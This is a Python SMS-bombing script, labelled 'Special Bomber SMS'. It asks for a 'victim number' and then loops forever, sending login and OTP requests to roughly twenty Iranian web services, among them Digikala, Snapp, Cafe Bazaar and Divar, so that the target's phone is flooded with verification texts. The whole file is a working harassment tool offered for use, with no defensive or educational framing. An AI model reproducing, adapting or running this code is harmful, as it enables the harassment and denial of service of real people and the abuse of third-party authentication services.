import requests
from colorama import Fore, Style
import time

print("")
print(Fore.CYAN + 'Special Bomber SMS') # Name-Source
print(Fore.GREEN + 'Author Mohammadreza Ezzati') # Author
print(Style.RESET_ALL)

phone = input(Fore.YELLOW + 'Enter the victim number without zeros (9*********):') # Phone-Iran
print(Style.RESET_ALL)

print(Fore.CYAN + 'Start...')
print(Style.RESET_ALL)

while True:

    # Digikala
    responses = requests.post("https://api.digikala.com/v1/user/authenticate/", json={"username":f"0{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success!')
        time.sleep(3)
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Snap
    responses = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", json={"cellphone":f"+98{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success!')
        time.sleep(3)
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Bazar
    responses = requests.post("https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest", json={"properties":{"language":2,"clientID":"c2dqmjg5ag3um03lrnmqj4pmqaamz3rd","deviceID":"c2dqmjg5ag3um03lrnmqj4pmqaamz3rd","clientVersion":"web"},"singleRequest":{"getOtpTokenRequest":{"username":f"98{phone}"}}})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success!')
        time.sleep(3)
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Ali-Baba
    responses = requests.post("https://ws.alibaba.ir/api/v3/account/mobile/otp", json={ "phoneNumber": f"0{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success!')
        time.sleep(3)
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Ponisha
    responses = requests.post("https://ponisha.ir/send-mobile-verfication", json={ "mobile": f"+98{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success!')
        time.sleep(3)
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # login-filmo
    responses = requests.post("https://www.filimo.com/api/fa/v1/user/Authenticate/country_code", json={"mobile":f"0{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success!')
        time.sleep(3)
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Divar
    responses = requests.post("https://api.divar.ir/v5/auth/authenticate", json={"phone":f"0{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success!')
        time.sleep(3)
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Torob
    responses = requests.get(f"https://api.torob.com/v4/user/phone/send-pin/?phone_number=0{phone}")
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success!')
        time.sleep(3)
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Telewebion
    responses = requests.post("https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one?isForeign=true", json={"code":"98","phone":f"{phone}","smsStatus":"default"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success!')
        time.sleep(3)
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Timcheh
    responses = requests.post("https://api.timcheh.com/auth/otp/send", json={"mobile":f"0{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success!')
        time.sleep(3)
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Mobit
    responses = requests.post("https://api.mobit.ir/api/web/v6/register/login", json={"number":f"0{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success!')
        time.sleep(3)
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Kilid
    responses = requests.post("https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL", json={"mobile":f"0{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success!')
        time.sleep(3)
    else:
        print(Fore.RED + '[-] Not Send SMS!')

     # Behtarino
    responses = requests.post("https://bck.behtarino.com/api/v1/users/phone_verification/", json={"phone":f"0{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success!')
        time.sleep(3)
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Ostadkar
    responses = requests.post("https://api.ostadkr.com/login", json={"mobile":f"0{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success!')
        time.sleep(3)
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # snapp.market
    responses = requests.post(f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{phone}")
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success!')
        time.sleep(3)
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Banimode
    responses = requests.post("https://mobapi.banimode.com/api/v2/auth/request", json={"phone":f"0{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success!')
        time.sleep(3)
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Drdr
    responses = requests.post("https://drdr.ir/api/registerEnrollment/verifyMobile", json={"phoneNumber":f"{phone}","userType":"PATIENT"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success!')
        time.sleep(3)
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Jabama
    responses = requests.post("https://taraazws.jabama.com/api/v4/account/send-code", json={"mobile":f"0{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success!')
        time.sleep(3)
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Flightio
    responses = requests.post("https://flightio.com/bff/Authentication/CheckUserKey", json={"userKey":f"98-{phone}","userKeyType":1})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success!')
        time.sleep(3)
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Football360
    responses = requests.post("https://football360.ir/api/auth/verify-phone/", json={"phone_number":f"+98{phone}"})
    if responses.status_code == 200:
        print(Fore.GREEN + '[+] Success!')
        time.sleep(3)
    else:
        print(Fore.RED + '[-] Not Send SMS!')

    # Restart
    print(Fore.CYAN + 'Restart, please wait...')
    print("")
    time.sleep(5)

    
